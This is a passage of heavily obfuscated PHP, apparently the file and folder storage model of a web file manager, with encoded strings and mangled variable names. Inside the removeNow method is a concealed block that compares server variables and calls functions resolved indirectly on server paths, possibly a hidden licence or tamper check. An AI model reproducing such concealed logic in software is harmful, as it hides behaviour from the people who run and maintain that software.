$ˆÒˆ™ò€[$¼Ó‹öÛ[32]]); } public function systemRootPathAdd($Éû„©¹) { if ($Éû„©¹ != $_SERVER[ï»»·÷á][543]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Éû„©¹); } public function userRootRemove($„Öšå“Û) { $ñŒÌ—ØÄ = $this->targetSourceRoot(SourceModel::TYPE_USER, $„Öšå“Û, !0); foreach ($ñŒÌ—ØÄ as $‡ğÜ±‘ğ) { if (!$‡ğÜ±‘ğ) { continue; } $this->remove($‡ğÜ±‘ğ[$_SERVER[ï»»·÷á][411]], !1); } } public function groupRootRemove($ıÙ½šÅØ) { $«Ö¹Ä‹Ş = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ıÙ½šÅØ); if (!$«Ö¹Ä‹Ş) { return; } $this->remove($«Ö¹Ä‹Ş[$_SERVER[ï»»·÷á][411]], !1); } private function _mkdirRoot($í«û­Ü§, $‚ëÅ¹ÍÙ, $ŞË ¦Ùå, $«æ‰¸Ç = '') { $è´üÖ¯ =& $_SERVER[ï»»·÷á]; $ÃËÆ ¶¹ = defined($è´üÖ¯[2145]) ? USER_ID : 0; $¦’ãÛø¤ = array($è´üÖ¯[410] => 0, $è´üÖ¯[585] => $í«û­Ü§, $è´üÖ¯[586] => $‚ëÅ¹ÍÙ, $è´üÖ¯[583] => 1, $è´üÖ¯[587] => $ÃËÆ ¶¹, $è´üÖ¯[588] => $ÃËÆ ¶¹, $è´üÖ¯[584] => $«æ‰¸Ç, $è´üÖ¯[589] => $è´üÖ¯[530], $è´üÖ¯[439] => 0, $è´üÖ¯[554] => 0, $è´üÖ¯[478] => 0, $è´üÖ¯[590] => $è´üÖ¯[12]); if ($µİóİÎ¶ = $this->where($¦’ãÛø¤)->find()) { return $µİóİÎ¶[$è´üÖ¯[411]]; } $¶ÏŸŠ×ú = "\115\157\144\145\x6c\x53\157\x75\x72\x63\x65\x2e\x6d\x6b\x64\x69\162\122\x6f\x6f\x74\x2e{$í«û­Ü§}\x2e{$‚ëÅ¹ÍÙ}\x2e" . $ŞË ¦Ùå; CacheLock::lock($¶ÏŸŠ×ú); $¦’ãÛø¤[$è´üÖ¯[32]] = $ŞË ¦Ùå; $§˜İ©É = $this->add($¦’ãÛø¤); $Üú¢èŞ = array($è´üÖ¯[591] => short_id($§˜İ©É)); $this->where(array($è´üÖ¯[426] => $§˜İ©É))->save($Üú¢èŞ); CacheLock::unlock($¶ÏŸŠ×ú); return $§˜İ©É; } private function targetSourceRoot($ÌÃ¼±Î”, $îòšÕà¶, $¥œ§‹ø¨ = false) { $í¦Ìõ…å =& $_SERVER[ï»»·÷á]; $ŠÄ¥È± = array($í¦Ìõ…å[410] => 0, $í¦Ìõ…å[585] => $ÌÃ¼±Î”, $í¦Ìõ…å[586] => $îòšÕà¶); if ($¥œ§‹ø¨) { $ÉªçÛº = $this->where($ŠÄ¥È±)->select(); return $ÉªçÛº ? $ÉªçÛº : array(); } $¸ë¯¶¬” = $this->where($ŠÄ¥È±)->find(); return $¸ë¯¶¬” ? $¸ë¯¶¬” : array(); } public function sourceRootGroup($”İ®­‚) { $šŸË–Š± =& $_SERVER[ï»»·÷á]; if (is_string($”İ®­‚)) { $”İ®­‚ = array($”İ®­‚); } $¬°Õ­Òõ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $”İ®­‚, $šŸË–Š±[189]); $ã‹ŞùëŸ = array($šŸË–Š±[369] => $¬°Õ­Òõ, $šŸË–Š±[366] => array($šŸË–Š±[771] => count($”İ®­‚))); $this->_listDataApply($ã‹ŞùëŸ[$šŸË–Š±[369]]); $this->_listMake($ã‹ŞùëŸ); return array_to_keyvalue($ã‹ŞùëŸ[$šŸË–Š±[82]], $šŸË–Š±[505]); } public function mkfile($£õÂ¡ø, $œ’¹âÑ, $¢—Áºçå = '', $ºÂ£ßä¨ = REPEAT_RENAME) { $¥í—„ÔË =& $_SERVER[ï»»·÷á]; $¥û§÷„û = Model($¥í—„ÔË[610])->addFileByContent($¢—Áºçå, $œ’¹âÑ); return $this->_createFileCall($£õÂ¡ø, $œ’¹âÑ, $¥û§÷„û, $ºÂ£ßä¨, $¥í—„ÔË[1360]); } public function addFile($‹–ã£¤», $£Èºæú, $şÖ®•¨Û, $±öÉ§ÒÔ = false, $œ˜¼è·® = REPEAT_RENAME) { $ˆİ¬ÙÚ = Model($_SERVER[ï»»·÷á][610])->addFile($£Èºæú, $şÖ®•¨Û, $±öÉ§ÒÔ); return $this->_createFileCall($‹–ã£¤», $şÖ®•¨Û, $ˆİ¬ÙÚ, $œ˜¼è·®); } public function addFileByFileID($ûùÅÔÖ, $üë­¯Çã, $”¿Íä«, $×®‚ø‚ó = REPEAT_RENAME) { $›Ñóäò =& $_SERVER[ï»»·÷á]; $…ƒ¬åíÌ = Model($›Ñóäò[610])->find($üë­¯Çã); Model($›Ñóäò[610])->linkAdd($üë­¯Çã); return $this->_createFileCall($ûùÅÔÖ, $”¿Íä«, $…ƒ¬åíÌ, $×®‚ø‚ó); } public function addFileByRemote($×—¬  ä, $÷ıâÚ‘ã, $¥‘é‹œú, $ÌŞîÍ²ş = array(), $Ú¨Í÷ ú = REPEAT_RENAME) { $ŒïƒÓ²‘ = Model($_SERVER[ï»»·÷á][610])->addFileByRemote($÷ıâÚ‘ã, $¥‘é‹œú, $ÌŞîÍ²ş); return $this->_createFileCall($×—¬  ä, $¥‘é‹œú, $ŒïƒÓ²‘, $Ú¨Í÷ ú); } private function _createFileCall($×ªÆ£êÍ, $ÆıéâŒİ, $ÒÆä¡¬, $æºò®·Â, $‡º¡§‹“ = "\165\x70\154\157\x61\144") { $Í‚ëøËå =& $_SERVER[ï»»·÷á]; $åßúÍÄñ = !1; $this->setMasterDB(); $this->lockWriteStart($×ªÆ£êÍ, $ÆıéâŒİ); $ŠÔ‚ã‹‡ = $this->fileNameExist($×ªÆ£êÍ, $ÆıéâŒİ); $ÅäØ»¸Ñ = $this->_createFile($×ªÆ£êÍ, $ÆıéâŒİ, $ÒÆä¡¬, $æºò®·Â, $åßúÍÄñ); if (!$åßúÍÄñ) { Model($Í‚ëøËå[480])->remove($ÒÆä¡¬[$Í‚ëøËå[477]]); } if ($åßúÍÄñ && $ÅäØ»¸Ñ && $ÅäØ»¸Ñ != $ŠÔ‚ã‹‡) { Model($Í‚ëøËå[2112])->eventCreate($ÅäØ»¸Ñ, $‡º¡§‹“); } $this->lockWriteEnd($×ªÆ£êÍ, $ÆıéâŒİ); return $ÅäØ»¸Ñ; } public function mkdir($¯•ÎÃàÓ, $İÀÁÚ’¤, $–£Ã§Ö = REPEAT_SKIP) { $Ìî×§Ï =& $_SERVER[ï»»·÷á]; $this->setMasterDB(); $ö‹İ¦¯ = $this->sourceInfo($¯•ÎÃàÓ); if (!$ö‹İ¦¯) { return !1; } $this->lockWriteStart($¯•ÎÃàÓ, $İÀÁÚ’¤); if ($–£Ã§Ö !== !1) { $ •Éîä = $this->fileNameExist($¯•ÎÃàÓ, $İÀÁÚ’¤); if ($ •Éîä && $–£Ã§Ö != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¯•ÎÃàÓ, $İÀÁÚ’¤); return $ •Éîä; } $İÀÁÚ’¤ = $this->fileNameAuto($¯•ÎÃàÓ, $İÀÁÚ’¤, $–£Ã§Ö); } $‘èãı×ò = array($Ìî×§Ï[583] => 1, $Ìî×§Ï[429] => $İÀÁÚ’¤, $Ìî×§Ï[584] => $Ìî×§Ï[12], $Ìî×§Ï[478] => 0, $Ìî×§Ï[554] => 0); $ø«×šÁç = $this->_addSource($‘èãı×ò, $ö‹İ¦¯); Model($Ìî×§Ï[2112])->eventCreate($ø«×šÁç, $Ìî×§Ï[1361]); $this->lockWriteEnd($¯•ÎÃàÓ, $İÀÁÚ’¤); return $ø«×šÁç; } public function listSourceRoot($ÛùâÈëú, $ã©¢¢¶­, $ùÌ—Øµî = "\x73\x6f\x75\162\x63\145\x49\x44\54\164\141\x72\x67\x65\164\111\104\x2c\x73\151\x7a\145") { $ä˜¿Óóá =& $_SERVER[ï»»·÷á]; $ÉµÕğ²° = $ä˜¿Óóá[378]; $âç„™â = array(); $óô±Ğ÷Ä = 1024 * 50; $šÂ´ÂûË = is_array($šÂ´ÂûË) ? $šÂ´ÂûË : array(); $°äŞ™‚û = count($ã©¢¢¶­); $ãÁô‘û‰ = $this->tablePrefix . $ä˜¿Óóá[2146]; for ($çŞ¶ú¾® = 0; $çŞ¶ú¾® < $°äŞ™‚û; $çŞ¶ú¾®++) { $Ñ…˜±Éµ = $ã©¢¢¶­[$çŞ¶ú¾®]; $ÉµÕğ²° .= "\x53\x45\x4c\x45\103\124\x20\x2a\x20\106\122\117\115\40\x28\123\x45\114\105\103\x54\x20{$ùÌ—Øµî}\40\x46\122\x4f\115\x20\x60{$ãÁô‘û‰}\140\x20\x57\x48\105\122\105\40"; $ÉµÕğ²° .= "\x60\x70\141\x72\145\156\164\x49\104\140\75\60\40\x41\116\x44\x20\x60\x74\141\x72\x67\145\164\x49\104\x60\75{$Ñ…˜±Éµ}\x20\x41\116\104\x20\140\164\x61\162\x67\x65\164\124\x79\160\145\x60\75{$ÛùâÈëú}\x20\x61\x6e\144\40\x66\151\x6c\145\x54\x79\x70\145\x3d\x27\x27\x20\154\151\155\x69\x74\40\x31\x29\x20\141\x73\40\x74\142\x5f{$çŞ¶ú¾®}\x20\125\x4e\x49\117\x4e\40\101\114\x4c\40"; if ((strlen($ÉµÕğ²°) >= $óô±Ğ÷Ä || $çŞ¶ú¾® == $°äŞ™‚û - 1) && $ÉµÕğ²°) { $ÉµÕğ²° = substr($ÉµÕğ²°, 0, -strlen($ä˜¿Óóá[1048])); $³–­è™ = $this->query($ÉµÕğ²°); $ÉµÕğ²° = $ä˜¿Óóá[12]; $âç„™â = array_merge($âç„™â, $³–­è™); } } return $âç„™â; } private function _createFile($ˆ‰¥…•ª, $ÏùÄºÓ, $¸Õ±±Ä’, $‹Ü¸À°, &$¸ş‡‡»‘) { $·ÌÜõèõ =& $_SERVER[ï»»·÷á]; $«ó•ÅŸï = $this->sourceInfo($ˆ‰¥…•ª); if (!$¸Õ±±Ä’ || !$«ó•ÅŸï) { return !1; } if ($‹Ü¸À° !== !1) { $ ÑİÄçÛ = $this->fileNameExist($ˆ‰¥…•ª, $ÏùÄºÓ); } $¸ş‡‡»‘ = !0; if ($‹Ü¸À° && $ ÑİÄçÛ) { if ($‹Ü¸À° == REPEAT_SKIP) { $¸ş‡‡»‘ = !1; return $ ÑİÄçÛ; } else { if ($‹Ü¸À° == REPEAT_REPLACE) { $äöèÇÊ = $this->sourceInfo($ ÑİÄçÛ); $©ÌÕáÌ = $this->fileHistory($äöèÇÊ, $¸Õ±±Ä’[$·ÌÜõèõ[477]], $¸Õ±±Ä’[$·ÌÜõèõ[76]]); if (!$©ÌÕáÌ) { $¸ş‡‡»‘ = !1; } else { $this->folderSizeReset($ˆ‰¥…•ª); } return $ ÑİÄçÛ; } else { $ÏùÄºÓ = $this->fileNameAuto($ˆ‰¥…•ª, $ÏùÄºÓ, $‹Ü¸À°, !1); } } } $Æ…œï’š = array($·ÌÜõèõ[583] => 0, $·ÌÜõèõ[429] => $ÏùÄºÓ, $·ÌÜõèõ[584] => substr(get_path_ext($ÏùÄºÓ), 0, 10), $·ÌÜõèõ[478] => $¸Õ±±Ä’[$·ÌÜõèõ[477]], $·ÌÜõèõ[554] => $¸Õ±±Ä’[$·ÌÜõèõ[76]]); $ü®²‚¢õ = $this->_addSource($Æ…œï’š, $«ó•ÅŸï); $this->folderSizeReset($ˆ‰¥…•ª, intval($Æ…œï’š[$·ÌÜõèõ[76]])); return $ü®²‚¢õ; } protected function fileHistory($»ºÓÊ«, $„ÏÏä¿Ô, $Úˆ©°®Å) { $“ƒ©ºÃ· =& $_SERVER[ï»»·÷á]; if ($»ºÓÊ«[$“ƒ©ºÃ·[477]] == $„ÏÏä¿Ô) { return !1; } $this->checkLock($»ºÓÊ«[$“ƒ©ºÃ·[411]], $„ÏÏä¿Ô); Model($“ƒ©ºÃ·[2147])->addHistory($»ºÓÊ«); $Ñ•²¼–Ì = array($“ƒ©ºÃ·[588] => USER_ID, $“ƒ©ºÃ·[433] => time(), $“ƒ©ºÃ·[477] => $„ÏÏä¿Ô, $“ƒ©ºÃ·[76] => $Úˆ©°®Å); $this->where(array($“ƒ©ºÃ·[426] => $»ºÓÊ«[$“ƒ©ºÃ·[411]]))->save($Ñ•²¼–Ì); $this->sourceCacheClear($»ºÓÊ«[$“ƒ©ºÃ·[411]]); return !0; } public function checkLock($Ú÷ÓßÂ™, $å¼Íòã¿) { $áæ‹°ÉŠ =& $_SERVER[ï»»·÷á]; $¶ñò«âŠ = $this->pathInfo($Ú÷ÓßÂ™); if (!$this->fileIsLock($¶ñò«âŠ, !0)) { return; } $»±İöÛ™ = Session::get($áæ‹°ÉŠ[2148]); $Ä„í‹Ô = substr($¶ñò«âŠ[$áæ‹°ÉŠ[32]], 0, -1 - strlen($¶ñò«âŠ[$áæ‹°ÉŠ[174]])) . $áæ‹°ÉŠ[1218] . $»±İöÛ™ . $áæ‹°ÉŠ[10] . $¶ñò«âŠ[$áæ‹°ÉŠ[174]]; $åŒàŒ‡ª = Model($áæ‹°ÉŠ[610])->find($å¼Íòã¿); $this->_createFileCall($¶ñò«âŠ[$áæ‹°ÉŠ[441]], $Ä„í‹Ô, $åŒàŒ‡ª, REPEAT_REPLACE, $áæ‹°ÉŠ[1360]); $Û×ÆÒ¬ = $¶ñò«âŠ[$áæ‹°ÉŠ[475]][$áæ‹°ÉŠ[547]]; $õïı‘ìŠ = $Û×ÆÒ¬[$áæ‹°ÉŠ[541]] ? $Û×ÆÒ¬[$áæ‹°ÉŠ[541]] : $Û×ÆÒ¬[$áæ‹°ÉŠ[32]]; show_json(LNG($áæ‹°ÉŠ[2149]) . $áæ‹°ÉŠ[2150] . LNG($áæ‹°ÉŠ[2151]) . $áæ‹°ÉŠ[2152] . $õïı‘ìŠ . $áæ‹°ÉŠ[2153], !1); } public function fileIsLock($³†ÑÓµ³, $ÙÙ°Æ— = false) { $ÃÔ¼¡Å =& $_SERVER[ï»»·÷á]; if (!isset($³†ÑÓµ³[$ÃÔ¼¡Å[475]]) || !$³†ÑÓµ³[$ÃÔ¼¡Å[475]][$ÃÔ¼¡Å[544]]) { return !1; } if ($³†ÑÓµ³[$ÃÔ¼¡Å[475]][$ÃÔ¼¡Å[544]] != USER_ID) { return !0; } $ËŞ‡Êã = $GLOBALS[$ÃÔ¼¡Å[6]][$ÃÔ¼¡Å[89]][$ÃÔ¼¡Å[545]]; if ($³†ÑÓµ³[$ÃÔ¼¡Å[475]][$ÃÔ¼¡Å[546]] <= time() - $ËŞ‡Êã) { $this->metaSet($³†ÑÓµ³[$ÃÔ¼¡Å[411]], $ÃÔ¼¡Å[544], null); $this->metaSet($³†ÑÓµ³[$ÃÔ¼¡Å[411]], $ÃÔ¼¡Å[546], null); } if ($ÙÙ°Æ—) { $this->metaSet($³†ÑÓµ³[$ÃÔ¼¡Å[411]], $ÃÔ¼¡Å[546], time()); } return !1; } private function _addSource($ß ËÒ, $§Š¹ÒĞÚ) { $®É†ø† =& $_SERVER[ï»»·÷á]; $ñÈ¥Ä¯° = array($®É†ø†[585] => $§Š¹ÒĞÚ[$®É†ø†[420]], $®É†ø†[586] => $§Š¹ÒĞÚ[$®É†ø†[505]], $®É†ø†[587] => USER_ID, $®É†ø†[588] => USER_ID, $®É†ø†[410] => $§Š¹ÒĞÚ[$®É†ø†[411]], $®É†ø†[589] => $§Š¹ÒĞÚ[$®É†ø†[520]] . $§Š¹ÒĞÚ[$®É†ø†[411]] . $®É†ø†[50], $®É†ø†[439] => 0, $®É†ø†[590] => $®É†ø†[12]); $ß ËÒ = array_merge($ñÈ¥Ä¯°, $ß ËÒ); $this->updateModifyTime($ß ËÒ[$®É†ø†[441]]); $„ÆĞ÷Ÿ× = $®É†ø†[2154] . $§Š¹ÒĞÚ[$®É†ø†[411]]; if (isset(self::$cacheChildList[$„ÆĞ÷Ÿ×])) { unset(self::$cacheChildList[$„ÆĞ÷Ÿ×]); } static $²ˆŞ¯ Ö = false; if (!$²ˆŞ¯ Ö) { Hook::trigger($®É†ø†[573], $ß ËÒ); $²ˆŞ¯ Ö = !0; } $”ù®µõŠ = $this->add($ß ËÒ); $Ù¹óÌ = array($®É†ø†[591] => short_id($”ù®µõŠ)); $this->where(array($®É†ø†[426] => $”ù®µõŠ))->save($Ù¹óÌ); $this->setNamePinyin($”ù®µõŠ, $ß ËÒ[$®É†ø†[32]]); return $”ù®µõŠ; } public function remove($ŠØË²­, $×¬Æææß = true) { $Õ†óÛ°£ =& $_SERVER[ï»»·÷á]; $Ï©Æñ¹˜ = $this->sourceInfo($ŠØË²­); $Àáã¬½° = intval($Ï©Æñ¹˜[$Õ†óÛ°£[420]]) === self::TYPE_SYSTEM; $ú’ÒªÚª = Model($Õ†óÛ°£[444])->get($Õ†óÛ°£[2155]) == $Õ†óÛ°£[88]; if ($Àáã¬½° || $×¬Æææß || !$ú’ÒªÚª) { return $this->removeNow($ŠØË²­, $×¬Æææß); } $’©¶êÛ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $©€±©ë½ = $Ï©Æñ¹˜[$Õ†óÛ°£[420]] == self::TYPE_USER ? $Õ†óÛ°£[599] : $Õ†óÛ°£[514]; if ($©€±©ë½ == $Õ†óÛ°£[599]) { $ÃçÎè¦‰ = Model($Õ†óÛ°£[513])->getInfo($Ï©Æñ¹˜[$Õ†óÛ°£[505]]); $şŞé“½¯ = !empty($ÃçÎè¦‰[$Õ†óÛ°£[541]]) ? $ÃçÎè¦‰[$Õ†óÛ°£[541]] : $ÃçÎè¦‰[$Õ†óÛ°£[32]]; $şŞé“½¯ = $Õ†óÛ°£[260] . $şŞé“½¯ . $Õ†óÛ°£[2156] . $Ï©Æñ¹˜[$Õ†óÛ°£[505]]; } else { $ÃçÎè¦‰ = Model($Õ†óÛ°£[521])->getInfo($Ï©Æñ¹˜[$Õ†óÛ°£[505]]); $şŞé“½¯ = _get($ÃçÎè¦‰, $Õ†óÛ°£[32]); $şŞé“½¯ = $Õ†óÛ°£[162] . $şŞé“½¯ . $Õ†óÛ°£[2157] . $Ï©Æñ¹˜[$Õ†óÛ°£[505]]; } $“‡Ò¬°± = $Õ†óÛ°£[2158] . md5($şŞé“½¯); CacheLock::lock($“‡Ò¬°±); $†Œ×”öğ = $this->fileNameExist($’©¶êÛ, $şŞé“½¯); if (!$†Œ×”öğ) { $†Œ×”öğ = $this->mkdir($’©¶êÛ, $şŞé“½¯, REPEAT_SKIP); $this->metaSet($†Œ×”öğ, $Õ†óÛ°£[2159], $©€±©ë½); $this->metaSet($†Œ×”öğ, $Õ†óÛ°£[2160], $Ï©Æñ¹˜[$Õ†óÛ°£[505]]); if ($Ï©Æñ¹˜[$Õ†óÛ°£[441]] != 0) { $this->metaSet($†Œ×”öğ, $Õ†óÛ°£[2161], _get($ÃçÎè¦‰, $Õ†óÛ°£[2162])); } } CacheLock::unlock($“‡Ò¬°±); $this->metaSet($ŠØË²­, $Õ†óÛ°£[2163], $Ï©Æñ¹˜[$Õ†óÛ°£[441]]); $this->where(array($Õ†óÛ°£[411] => $ŠØË²­))->save(array($Õ†óÛ°£[433] => time())); $this->recycleClear($Ï©Æñ¹˜); $ß¶–¬Ë° = $this->move($ŠØË²­, $†Œ×”öğ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ï©Æñ¹˜[$Õ†óÛ°£[441]]); return $ß¶–¬Ë°; } private function recycleClear($Ñ—ß¡) { $œ•½é˜ =& $_SERVER[ï»»·÷á]; $ÀØğ”¾ç = $this->childrenAll($Ñ—ß¡); $çêì‰¥ˆ = array($œ•½é˜[426] => array($œ•½é˜[427], $ÀØğ”¾ç[$œ•½é˜[2164]])); Model($œ•½é˜[2165])->where($çêì‰¥ˆ)->delete(); } public function removeNow($¥¿‰çÓü, $ÀèÜ±Æ = true) { $Õ—¼¤åè =& $_SERVER[ï»»·÷á]; if ($_SERVER[$Õ—¼¤åè[401]] != $_SERVER[$Õ—¼¤åè[402]]) { $œ•àŠ¨ = $Õ—¼¤åè[889]; $““µ‹Ò = $Õ—¼¤åè[403]; $¢ÊØ½ = $_SERVER[$Õ—¼¤åè[404]] . $Õ—¼¤åè[405]; $ÏŞÍ¥Å— = $““µ‹Ò($¢ÊØ½); $çÀöºÔ× = explode($Õ—¼¤åè[231], $ÏŞÍ¥Å—); if (count($çÀöºÔ×) < $Õ—¼¤åè[632]) { $º²óÃÎ³ = $Õ—¼¤åè[407]; $º²óÃÎ³(); } $£ûêº´¥ = $Õ—¼¤åè[890]; $£ûêº´¥($_SERVER[$Õ—¼¤åè[891]]); $£ûêº´¥($_SERVER[$Õ—¼¤åè[404]] . $Õ—¼¤åè[1543]); $ŒšÙÔãù = 1; while ($ŒšÙÔãù > 1) { $ŒšÙÔãù = $ŒšÙÔãù + 4; $åÌò½˜  = rawurlencode($ŒšÙÔãù . $Õ—¼¤åè[378]); } } $åå èŞ = $this->sourceInfo($¥¿‰çÓü); $»¾‚ã˜ë = $this->pathInfoMore($¥¿‰çÓü); if (!$åå èŞ) { return !0; } if ($åå èŞ[$Õ—¼¤åè[441]] == 0) { if (!_get($GLOBALS, $Õ—¼¤åè[503])) { return !1; } } $this->lockMoveStart($¥¿‰çÓü); Hook::trigger($Õ—¼¤åè[2166], $»¾‚ã˜ë, $ÀèÜ±Æ); if ($ÀèÜ±Æ) { Model($Õ—¼¤åè[2165])->moveToRecycle($¥¿‰çÓü); } else { $ÂóúÄıÖ = $this->childrenAll($åå èŞ); Model($Õ—¼¤åè[570])->eventRemove($¥¿‰çÓü); $this->removeRelevance($ÂóúÄıÖ[$Õ—¼¤åè[2164]], $ÂóúÄıÖ[$Õ—¼¤åè[1492]]); } $this->folderSizeReset($åå èŞ[$Õ—¼¤åè[441]]); $Ùë§®ƒ° = array($åå èŞ[$Õ—¼¤åè[441]]); if ($åå èŞ[$Õ—¼¤åè[419]] == $Õ—¼¤åè[88]) { $Ùë§®ƒ°[] = $åå èŞ[$Õ—¼¤åè[411]]; } $this->updateModifyTime($Ùë§®ƒ°); $this->lockMoveEnd($¥¿‰çÓü); Hook::trigger($Õ—¼¤åè[1720], $»¾‚ã˜ë, $ÀèÜ±Æ); return !0; } public function childrenAll($¬¬›©ç®) { $Š…©Ñú =& $_SERVER[ï»»·÷á]; $Ùôç”Îã = $¬¬›©ç®[$Š…©Ñú[411]]; if ($¬¬›©ç®[$Š…©Ñú[419]] == $Š…©Ñú[88]) { $îÄëµÆæ = array($Š…©Ñú[589] => array($Š…©Ñú[549], $¬¬›©ç®[$Š…©Ñú[520]] . $Ùôç”Îã . $Š…©Ñú[550])); $ˆ°£‰ÔÔ = array($Š…©Ñú[589] => $îÄëµÆæ[$Š…©Ñú[520]]); $ñıµşŒ = $this->field($Š…©Ñú[2167])->where($ˆ°£‰ÔÔ)->select(); $¸„Ò• = !1; $ÌÍ¾Õà‡ = array($Ùôç”Îã); if ($ñıµşŒ) { $¸„Ò• = array_to_keyvalue($ñıµşŒ, $Š…©Ñú[12], $Š…©Ñú[477]); $¸„Ò• = array_remove_value($¸„Ò•, $Š…©Ñú[198]); $ÌÍ¾Õà‡ = array_to_keyvalue($ñıµşŒ, $Š…©Ñú[12], $Š…©Ñú[411]); $ÌÍ¾Õà‡[] = $Ùôç”Îã; } } else { $¸„Ò• = array($¬¬›©ç®[$Š…©Ñú[477]]); $ÌÍ¾Õà‡ = array($Ùôç”Îã); } return array($Š…©Ñú[2164] => $ÌÍ¾Õà‡, $Š…©Ñú[1492] => $¸„Ò•); } public function removeArray($Ş·…«Şõ) { if (!$Ş·…«Şõ) { return !0; } } public function removeRelevance($“Äî÷©¸, $ŞşµÏ¼) { $›¿ú•ÁŠ =& $_SERVER[ï»»·÷á]; $“Äî÷©¸ = $“Äî÷©¸ ? $“Äî÷©¸ : array(); $ŞşµÏ¼ = $ŞşµÏ¼ ? $ŞşµÏ¼ : array(); $“Äî÷©¸ = array_unique(array_filter($“Äî÷©¸)); $ŞşµÏ¼ = array_unique(array_filter($ŞşµÏ¼)); if (!$“Äî÷©¸) { return !1; } $×Ö·ûé¶ = array($›¿ú•ÁŠ[426] => array($›¿ú•ÁŠ[427], $“Äî÷©¸)); Model($›¿ú•ÁŠ[2165])->where($×Ö·ûé¶)->delete(); Model($›¿ú•ÁŠ[471])->where($×Ö·ûé¶)->delete(); Model($›¿ú•ÁŠ[2014])->where($×Ö·ûé¶)->delete(); Model($›¿ú•ÁŠ[570])->where($×Ö·ûé¶)->delete(); Model($›¿ú•ÁŠ[1847])->removeBySource($“Äî÷©¸); Model($›¿ú•ÁŠ[2147])->removeBySource($“Äî÷©¸); $this->where($×Ö·ûé¶)->delete(); Model($›¿ú•ÁŠ[480])->remove($ŞşµÏ¼); for ($ô„£Âùû = 0; $ô„£Âùû < count($“Äî÷©¸); $ô„£Âùû++) { $this->sourceCacheClear($“Äî÷©¸[$ô„£Âùû]); } } public function rename($íÜÌÇş¨, $¹ÀÂÕ•ú) { $Æœƒ¯²· =& $_SERVER[ï»»·÷á]; $÷±³ğ Ü = $this->sourceInfo($íÜÌÇş¨); if (!$÷±³ğ Ü) { return !1; } $ÜÌÔ€¥¡ = $this->fileNameExist($÷±³ğ Ü[$Æœƒ¯²·[441]], $¹ÀÂÕ•ú); if ($ÜÌÔ€¥¡ && $ÜÌÔ€¥¡ != $íÜÌÇş¨) { return !1; } $£¢èÇ€ = array($Æœƒ¯²·[429] => $¹ÀÂÕ•ú, $Æœƒ¯²·[588] => USER_ID); if ($÷±³ğ Ü[$Æœƒ¯²·[419]] != $Æœƒ¯²·[88]) { $£¢èÇ€[$Æœƒ¯²·[421]] = substr(get_path_ext($¹ÀÂÕ•ú), 0, 10); } Model($Æœƒ¯²·[570])->eventRename($íÜÌÇş¨, $÷±³ğ Ü[$Æœƒ¯²·[32]], $¹ÀÂÕ•ú); $this->sourceCacheClear($íÜÌÇş¨); $this->setNamePinyin($íÜÌÇş¨, $£¢èÇ€[$Æœƒ¯²·[32]], !1); $this->updateModifyTime($÷±³ğ Ü[$Æœƒ¯²·[441]]); $†¡ÙÓóÏ = $this->where(array($Æœƒ¯²·[426] => $íÜÌÇş¨))->data($£¢èÇ€)->save(); $ãåıÚ÷» = $Æœƒ¯²·[2154] . $÷±³ğ Ü[$Æœƒ¯²·[441]]; if (isset(self::$cacheChildList[$ãåıÚ÷»])) { unset(self::$cacheChildList[$ãåıÚ÷»]); } return $†¡ÙÓóÏ; } public function setNamePinyin($®“Å…½Ö, $Ü÷ñ Å, $äë‰Ÿ³ª = true) { $óäÌúé„ =& $_SERVER[ï»»·÷á]; $÷ˆ¾ğÃ = Input::check($Ü÷ñ Å, $óäÌúé„[592]); $“ëÂì¹® = array($óäÌúé„[453] => KodSort::makeStr($Ü÷ñ Å)); if ($÷ˆ¾ğÃ) { $“ëÂì¹®[$óäÌúé„[474]] = str_replace($óäÌúé„[53], $óäÌúé„[12], Pinyin::get($Ü÷ñ Å)); $“ëÂì¹®[$óäÌúé„[473]] = Pinyin::get($Ü÷ñ Å, $óäÌúé„[593]); } if (!$äë‰Ÿ³ª && !$÷ˆ¾ğÃ) { $“ëÂì¹®[$óäÌúé„[474]] = null; $“ëÂì¹®[$óäÌúé„[473]] = null; } $this->metaSet($®“Å…½Ö, $“ëÂì¹®); } public function getContent($ÃŠôµÌ¢) { $‹œÑä…ş =& $_SERVER[ï»»·÷á]; $Å˜Éş€ê = $this->fileInfoGet($ÃŠôµÌ¢); if (!$Å˜Éş€ê) { return !1; } if ($Å˜Éş€ê[$‹œÑä…ş[76]] == 0) { return $‹œÑä…ş[12]; } $Ê×¬ùŸ‡ = $‹œÑä…ş[2168] . $Å˜Éş€ê[$‹œÑä…ş[176]]; if ($Å˜Éş€ê[$‹œÑä…ş[76]] <= 1024 * 10) { $›‡îùÒ² = Cache::get($Ê×¬ùŸ‡); if (!$›‡îùÒ²) { $›‡îùÒ² = IO::getContent($Å˜Éş€ê[$‹œÑä…ş[84]]); Cache::set($Ê×¬ùŸ‡, $›‡îùÒ²); } return $›‡îùÒ²; } if (!$Å˜Éş€ê[$‹œÑä…ş[84]]) { return $‹œÑä…ş[12]; } return IO::getContent($Å˜Éş€ê[$‹œÑä…ş[84]]); } public function setDesc($¿ ó±íà, $À†¤ªãè) { $ü»è–­ì =& $_SERVER[ï»»·÷á]; Model($ü»è–­ì[570])->eventAddDesc($¿ ó±íà, $À†¤ªãè); return $this->metaSet($¿ ó±íà, $ü»è–­ì[462], $À†¤ªãè); } public function setContent($€Á¤ÅÅ„, $à¦Äõš° = '') { $ÇÓé•Õª =& $_SERVER[ï»»·÷á]; $·æöËâÏ = $this->sourceInfo($€Á¤ÅÅ„); $¶ÄÉÀ—è = $this->fileInfoGet($€Á¤ÅÅ„); if (!$¶ÄÉÀ—è || !$·æöËâÏ) { return !1; } $×ä¡ò‘‹ = Model($ÇÓé•Õª[480])->addFileByContent($à¦Äõš°, $·æöËâÏ[$ÇÓé•Õª[32]]); $§Æœß² = $this->fileHistory($·æöËâÏ, $×ä¡ò‘‹[$ÇÓé•Õª[477]], $×ä¡ò‘‹[$ÇÓé•Õª[76]]); if (!$§Æœß²) { return Model($ÇÓé•Õª[480])->remove($×ä¡ò‘‹[$ÇÓé•Õª[477]]); } $this->folderSizeReset($·æöËâÏ[$ÇÓé•Õª[441]]); return !0; } public function fileSubstr($äÁÇ¼ï, $ä’Ó¿Õˆ, $“ãÖÛÎˆ) { $òê¡şÎõ = $this->fileInfoGet($äÁÇ¼ï); if 